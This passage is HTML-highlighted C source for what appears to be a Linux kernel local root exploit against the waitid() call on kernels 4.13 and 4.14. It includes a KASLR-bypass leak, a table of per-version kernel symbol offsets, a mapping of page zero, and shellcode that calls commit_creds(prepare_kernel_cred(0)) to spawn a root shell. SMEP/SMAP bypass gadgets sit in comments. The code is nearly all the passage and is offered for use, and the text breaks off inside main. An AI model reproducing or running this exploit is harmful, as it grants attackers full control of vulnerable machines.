string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/wait.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/utsname.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/resource.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;syscall.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">KASLR_BYPASS</span> <span class=\"token expression\"><span class=\"token number\">1</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">SMEP_SMAP_BYPASS</span> <span class=\"token expression\"><span class=\"token number\">0</span></span></span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span> <span class=\"token operator\">*</span>daemon<span class=\"token punctuation\">)</span><span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">regparm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span> <span class=\"token operator\">*</span>new<span class=\"token punctuation\">)</span><span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">regparm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> kernel_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">prepare_kernel_cred_t</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">commit_creds_t</span> commit_creds<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// sudo sysctl -w vm.mmap_min_addr=0</span>\n<span class=\"token comment\">// sudo cat /proc/kallsyms | grep _text | head -n 1</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> k_offset<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* Linux Kernel 4.14.0-rc4+ info */</span> <span class=\"token comment\">/* trigger! */</span>\n    <span class=\"token number\">0x753d0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x75050</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xf3f45a</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* Linux Kernel 4.14.0-rc4 info */</span> <span class=\"token comment\">/* triggered! but process is killed */</span>\n    <span class=\"token number\">0xaa6a0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xaa310</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x106046c</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* Linux Kernel 4.13.0-16 info */</span> <span class=\"token comment\">/* not triggered */</span>\n    <span class=\"token number\">0xa8530</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// prepare_kernel_cred</span>\n    <span class=\"token number\">0xa81a0</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// commit_creds</span>\n    <span class=\"token number\">0x105ff2c</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">// have_canfork_callback</span>\n    <span class=\"token number\">0x1e540</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// native_read_cr4</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* Linux Kernel 4.13.4 info */</span> <span class=\"token comment\">/* trigger! but process is killed */</span>\n    <span class=\"token number\">0xa8340</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xa7fb0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x105fe2c</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* Linux Kernel 4.13.8 info */</span> <span class=\"token comment\">/* trigger! but process is killed */</span>\n    <span class=\"token number\">0xa8390</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xa8000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x106042c</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* Linux Kernel 4.13.10 info */</span> <span class=\"token comment\">/* not triggered */</span>\n    <span class=\"token number\">0xa8390</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xa8000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10603ac</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> user_cs <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> user_ss <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> user_rflags <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">backup_stat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>  \n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\"movq %%cs, %0\\n\"</span>\n        <span class=\"token string\">\"movq %%ss, %1\\n\"</span>\n        <span class=\"token string\">\"pushfq\\n\"</span>\n        <span class=\"token string\">\"popq %2\\n\"</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"=r\"</span> <span class=\"token punctuation\">(</span>user_cs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"=r\"</span> <span class=\"token punctuation\">(</span>user_ss<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"=r\"</span> <span class=\"token punctuation\">(</span>user_rflags<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"memory\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>commit_creds <span class=\"token operator\">&amp;&amp;</span> prepare_kernel_cred<span class=\"token punctuation\">)</span> <span class=\"token function\">commit_creds</span><span class=\"token punctuation\">(</span><span class=\"token function\">prepare_kernel_cred</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token function\">kaslr_bypass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token class-name\">pid_t</span> pid <span class=\"token operator\">=</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pid <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">rusage</span> ru <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">syscall</span><span class=\"token punctuation\">(</span>__NR_waitid<span class=\"token punctuation\">,</span> P_PID<span class=\"token punctuation\">,</span> pid<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> WEXITED <span class=\"token operator\">|</span> WNOHANG <span class=\"token operator\">|</span> __WNOTHREAD<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>ru<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>ru<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>ru <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>p<span class=\"token punctuation\">)</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>p <span class=\"token operator\">></span> <span class=\"token number\">0xffffffff00000000</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">&lt;</span> <span class=\"token number\">0xffffffffff000000</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>p <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span><span class=\"token number\">0xfffff</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x100000</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token operator\">||</span> argc <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage : %s [&lt;kernel_base_addr>] &lt;kernel_version>\\n\"</span><span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> EXIT_SUCCESS<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>argc <span class=\"token operator\">==</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> kernel_base <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>argc <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> kernel_base <span class=\"token operator\">=</span> <span class=\"token function\">kaslr_bypass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>kernel_base <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[31m[-] Failed to leak kernel_base:(\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  \n  <span class=\"token function\">backup_stat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* backup userland env */</span>\n  \n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">utsname</span> buf<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">uname</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[36m[*] Kernel Version \\e[34m: %s\\n\"</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">.</span>release<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[35m[+] Kernel Base           \\e[34m: %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>kernel_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">int</span> k_ver <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span>argc <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>kernel_base <span class=\"token operator\">+</span> k_offset<span class=\"token punctuation\">[</span>k_ver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  commit_creds <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>kernel_base <span class=\"token operator\">+</span> k_offset<span class=\"token punctuation\">[</span>k_ver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token class-name\">siginfo_t</span> <span class=\"token operator\">*</span>have_canfork_callback <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">siginfo_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>kernel_base <span class=\"token operator\">+</span> k_offset<span class=\"token punctuation\">[</span>k_ver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[35m[+] prepare_kernel_cred   \\e[34m: %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>prepare_kernel_cred<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[35m[+] commit_creds          \\e[34m: %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>commit_creds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[35m[+] have_canfork_callback \\e[34m: %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>have_canfork_callback<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[36m[*] Stage 1 - Try to allocate 0x0\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> PROT_READ <span class=\"token operator\">|</span> PROT_WRITE <span class=\"token operator\">|</span> PROT_EXEC<span class=\"token punctuation\">,</span> MAP_ANON <span class=\"token operator\">|</span> MAP_PRIVATE <span class=\"token operator\">|</span> MAP_FIXED<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[31m[-] Failed to allocate 0x0\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[36m[*] Stage 2 - Inject shellcode\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> shellcode<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token comment\">/* insert 0 into have_canfork_callback */</span>\n      <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// mov rax, have_canfork_callback</span>\n      <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>                   <span class=\"token comment\">// mov [rax], 0x0</span>\n      <span class=\"token comment\">/* SMEP/SMAP Bypass */</span>\n      <span class=\"token comment\">// 0x68,</span>\n      <span class=\"token comment\">// 0xf0, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // push 0x00000000000006f0</span>\n      <span class=\"token comment\">// 0x5f, 0xc3,                                     // pop rdi; ret;</span>\n      <span class=\"token comment\">// 0x0f, 0x22, 0xe7, 0xc3,                         // mov cr4, rdi; ret;</span>\n      <span class=\"token comment\">/* call get_root() */</span>\n      <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// mov rax, &amp;get_root()</span>\n      <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span>                               <span class=\"token comment\">// call rax</span>\n      <span class=\"token comment\">/* userland info */</span>\n      <span class=\"token comment\">// 0x0f, 0x01, 0xf8, 0xc3                       // swapgs; ret;</span>\n      <span class=\"token comment\">// 0x48, 0xcf                                   // iretq;</span>\n      <span class=\"token comment\">// rip = get_shell</span>\n      <span class=\"token comment\">// cs = user_cs</span>\n      <span class=\"token comment\">// rflags = user_rflags</span>\n      <span class=\"token comment\">// rsp = asm('rsp')</span>\n      <span class=\"token comment\">// ss = user_ss</span>\n      <span class=\"token comment\">/* jmp to nullptr */</span>\n      <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span>                               <span class=\"token comment\">// xor rax, rax; ret;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  \n  offset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> have_canfork_callback<span class=\"token punctuation\">;</span>\n\n  offset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> get_root<span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> shellcode<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token class-name\">pid_t</span> pid<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pid <span class=\"token operator\">=</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pid <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[36m[*] Stage 3 - Trigger waitid()\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">waitid</span><span class=\"token punctuation\">(</span>P_PID<span class=\"token punctuation\">,</span> pid<span class=\"token punctuation\">,</span> have_canfork_callback<span class=\"token punctuation\">,</span> WEXITED <span class=\"token operator\">|</span> WSTOPPED <span class=\"token operator\">|</span> WCONTINUED<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"waitpid()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> 